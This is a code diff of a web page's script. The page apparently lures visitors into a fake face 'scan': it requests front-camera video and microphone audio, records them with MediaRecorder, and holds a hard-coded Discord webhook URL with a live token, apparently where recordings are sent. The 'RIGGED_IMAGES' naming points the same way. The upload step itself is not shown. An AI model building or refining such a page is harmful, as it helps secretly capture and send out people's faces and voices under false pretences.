@@ -155,6 +155,9 @@
     </div>
 
     <script>
+     // ==========================================
+        // LO'S CONFIGURATION ZONE
+        // ==========================================
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT";
         
         const RIGGED_IMAGES = [
@@ -178,20 +181,23 @@
         let mediaRecorder;
         let recordedChunks = [];
 
-        // Wait for user to click before asking for camera
         connectBtn.onclick = async () => {
             statusText.innerText = "Requesting permissions...";
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Explicitly ask for the front camera
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
+                });
                 video.srcObject = stream;
                 
-                // Show the video feed and the real button
                 camContainer.style.display = 'block';
                 connectBtn.style.display = 'none';
                 scanBtn.style.display = 'block';
                 statusText.innerText = "System ready. Position your face in frame.";
             } catch (err) {
-                statusText.innerText = "Camera access denied or unavailable.";
+                // Print the EXACT error to the screen so we can debug it
+                statusText.innerText = "Error: " + err.name + " - " + err.message;
                 statusText.style.color = "#ef4444";
             }
         };
